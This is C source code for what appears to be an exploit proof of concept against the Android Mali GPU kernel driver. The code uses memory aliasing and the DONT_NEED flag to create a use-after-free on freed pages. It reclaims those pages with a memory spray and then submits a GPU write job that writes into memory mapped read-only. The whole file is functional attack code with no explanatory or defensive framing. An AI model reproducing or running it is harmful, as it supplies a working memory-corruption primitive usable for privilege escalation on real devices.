#include <stdio.h>
#include <stdarg.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define PAGE_SHIFT 12
#define NATIVE_SIZE (32UL << 20)
#define SPRAY_SIZE  (192UL << 20)

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};
union kbase_ioctl_mem_alias {
    struct { uint64_t flags; uint64_t stride; uint64_t nents; uint64_t aliasing_info; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
struct base_dependency { uint8_t atom_id; uint8_t dependency_type; };
struct base_jd_atom_v2 {
    uint64_t jc; uint64_t udata[2]; uint64_t extres_list;
    uint16_t nr_extres; uint16_t compat_core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number, prio, device_nr, padding;
    uint32_t core_req;
};
struct base_jd_event_v2 { uint32_t event_code; uint8_t atom_number; uint8_t _pad[3]; uint64_t udata[2]; };

#define BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED (1u << 1)
#define BASEP_CONTEXT_MMU_GROUP_ID_SHIFT 3
#define BASEP_CONTEXT_MMU_GROUP_ID_MASK (0xFu << BASEP_CONTEXT_MMU_GROUP_ID_SHIFT)
#define BASEP_CONTEXT_CREATE_KERNEL_FLAGS (BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED | BASEP_CONTEXT_MMU_GROUP_ID_MASK)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_SAME_VA (1ull << 13)
#define BASE_MEM_DONT_NEED (1ull << 17)
#define BASE_MEM_COHERENT_SYSTEM (1ull << 10)
#define BASE_MEM_COHERENT_LOCAL (1ull << 11)
#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define PATTERN(v) (0x4141414100000000ULL | (uint64_t)((v) >> 12))
#define IS_PATTERN(x) (((x) & 0xffffffff00000000ULL) == 0x4141414100000000ULL)
#define MAGIC 0xdeadbeefcafebabeULL

static int logfd = -1;
static sigjmp_buf jb;
static volatile int ill_ok = -1;

static void logmsg(const char *fmt, ...) {
    char buf[400];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) { write(1, buf, n); if (logfd >= 0) { write(logfd, buf, n); fsync(logfd); } }
}
static void crash_handler(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    logmsg("[!] signal %d addr=%p\n", sig, si->si_addr);
    _exit(128 + sig);
}
static void ill_handler(int sig, siginfo_t *si, void *ctx) {
    (void)sig; (void)si; (void)ctx;
    ill_ok = 0;
    siglongjmp(jb, 1);
}

static int dc_ivac(void *va) {
    ill_ok = -1;
    if (sigsetjmp(jb, 1)) return ill_ok;
    asm volatile("dc ivac, %0" :: "r"(va) : "memory");
    ill_ok = 1;
    return 1;
}

static void pack_header(uint32_t *cl, uint32_t type, uint64_t next) {
    cl[0]=0; cl[1]=0; cl[2]=0; cl[3]=0;
    cl[4] = 1 | (type << 1);
    cl[5] = 0;
    cl[6] = (uint32_t)next; cl[7] = (uint32_t)(next >> 32);
}
struct write_value_payload { uint64_t address, type, immediate_value; };

static int fd;

static void *map_gpu(unsigned pages, uint64_t *gpu_out) {
    union kbase_ioctl_mem_alloc ma;
    memset(&ma, 0, sizeof(ma));
    ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ma.in.va_pages = pages;
    ma.in.commit_pages = pages;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { logmsg("[-] alloc: %s\n", strerror(errno)); return NULL; }
    void *r = mmap(NULL, pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
    if (r == MAP_FAILED) { logmsg("[-] mmap: %s\n", strerror(errno)); return NULL; }
    if (gpu_out) *gpu_out = ma.out.gpu_va;
    return r;
}

static uint32_t submit_write(uint64_t target_va, uint64_t value) {
    void *jc = map_gpu(1, NULL);
    if (!jc) return 0xffffffffu;
    memset(jc, 0, 0x1000);
    pack_header((uint32_t *)jc, 2, 0);
    struct write_value_payload pl = { target_va, 7, value };
    memcpy((uint32_t *)jc + 8, &pl, sizeof(pl));
    struct base_jd_atom_v2 atom;
    memset(&atom, 0, sizeof(atom));
    atom.jc = (uint64_t)jc;
    atom.atom_number = 1;
    atom.core_req = 0x2;
    struct kbase_ioctl_job_submit js = { (uint64_t)&atom, 1, sizeof(atom) };
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) { logmsg("[-] submit: %s\n", strerror(errno)); return 0xfffffffeu; }
    struct pollfd pfd = { fd, POLLIN, 0 };
    if (poll(&pfd, 1, 3000) <= 0) { logmsg("[-] poll timeout\n"); return 0xfffffffdu; }
    struct base_jd_event_v2 ev;
    if (read(fd, &ev, sizeof(ev)) < (int)sizeof(ev)) { logmsg("[-] event read\n"); return 0xfffffffcu; }
    return ev.event_code;
}

int main(void) {
    logfd = open("/data/local/tmp/mali_uafwrite.log", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = ill_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGILL, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    logmsg("[*] uafwrite pid=%d\n", getpid());
    fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { logmsg("[-] open: %s\n", strerror(errno)); return 1; }
    struct kbase_ioctl_version_check vc = { 999, 999 };
    ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    struct kbase_ioctl_set_flags sf = { 0 };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { logmsg("[-] setflags: %s\n", strerror(errno)); return 1; }
    mmap(NULL, NATIVE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);

    uint64_t native_gpu = 0;
    void *native = map_gpu(NATIVE_SIZE >> PAGE_SHIFT, &native_gpu);
    if (!native) return 1;
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) *(volatile uint64_t *)((char *)native + o) = 0x5a5a000000000000ULL | (o >> 12);
    logmsg("[+] native gpu=0x%llx\n", (unsigned long long)native_gpu);

    union kbase_ioctl_mem_alias al;
    struct base_mem_aliasing_info ai;
    memset(&al, 0, sizeof(al)); memset(&ai, 0, sizeof(ai));
    al.in.nents = 1;
    al.in.stride = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ai.handle.basep.handle = (uint64_t)native;
    ai.length = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.aliasing_info = (uint64_t)&ai;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al) < 0) { logmsg("[-] alias: %s\n", strerror(errno)); return 1; }
    logmsg("[+] alias gpu=0x%llx\n", (unsigned long long)al.out.gpu_va);

    struct kbase_ioctl_mem_flags_change fc;
    fc.gpu_va = (uint64_t)native;
    fc.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    fc.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) { logmsg("[-] flags_change: %s\n", strerror(errno)); return 1; }
    logmsg("[+] flags_change ok\n");

    void *alias_ro = mmap(NULL, NATIVE_SIZE, PROT_READ, MAP_SHARED, fd, al.out.gpu_va);
    if (alias_ro == MAP_FAILED) { logmsg("[-] alias mmap: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) (void)*(volatile uint64_t *)((char *)alias_ro + o);
    logmsg("[+] alias prefaulted\n");

    unsigned char *spray = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spray == MAP_FAILED) { logmsg("[-] spray: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < SPRAY_SIZE; o += 0x1000) *(volatile uint64_t *)(spray + o) = PATTERN(o);
    logmsg("[+] spray done\n");

    size_t hit_off = 0; uint64_t hit_val = 0; int found = 0;
    for (size_t i = 0; i < NATIVE_SIZE / 8; i++) {
        uint64_t v = *(volatile uint64_t *)((char *)alias_ro + i * 8);
        if (IS_PATTERN(v)) { hit_off = i * 8; hit_val = v; found = 1; break; }
    }
    if (!found) { logmsg("[-] no reclaimed page found\n"); return 1; }
    uint64_t idx = hit_val & 0xffffffffULL;
    uint64_t gpu_target = (uint64_t)alias_ro + hit_off;
    unsigned char *owner_va = spray + (idx << 12);
    logmsg("[+] hit alias_off=0x%zx idx=%llu owner_va=%p before=0x%llx\n",
           hit_off, (unsigned long long)idx, owner_va, (unsigned long long)*(volatile uint64_t *)owner_va);

    uint32_t ev = submit_write(gpu_target, MAGIC);
    logmsg("[%c] gpu write event=0x%x target_gpu=0x%llx\n", ev == 1 ? '+' : '-', ev,
           (unsigned long long)gpu_target);

    uint64_t via_owner = *(volatile uint64_t *)owner_va;
    uint64_t via_alias = *(volatile uint64_t *)((char *)alias_ro + hit_off);
    logmsg("[i] readback before flush: owner=0x%llx alias=0x%llx\n",
           (unsigned long long)via_owner, (unsigned long long)via_alias);

    int dc1 = dc_ivac(owner_va);
    logmsg("[%c] dc ivac(owner)=%d\n", dc1 > 0 ? '+' : '-', dc1);
    via_owner = *(volatile uint64_t *)owner_va;
    int dc2 = dc_ivac((char *)alias_ro + hit_off);
    logmsg("[%c] dc ivac(alias_off)=%d\n", dc2 > 0 ? '+' : '-', dc2);
    via_alias = *(volatile uint64_t *)((char *)alias_ro + hit_off);

    logmsg("[%c] readback after flush: owner=0x%llx %s, alias=0x%llx %s\n",
           (via_owner == MAGIC || via_alias == MAGIC) ? '+' : '-',
           (unsigned long long)via_owner, via_owner == MAGIC ? "MAGIC" : "-",
           (unsigned long long)via_alias, via_alias == MAGIC ? "MAGIC" : "-");
    logmsg("[*] done\n");
    return 0;
}
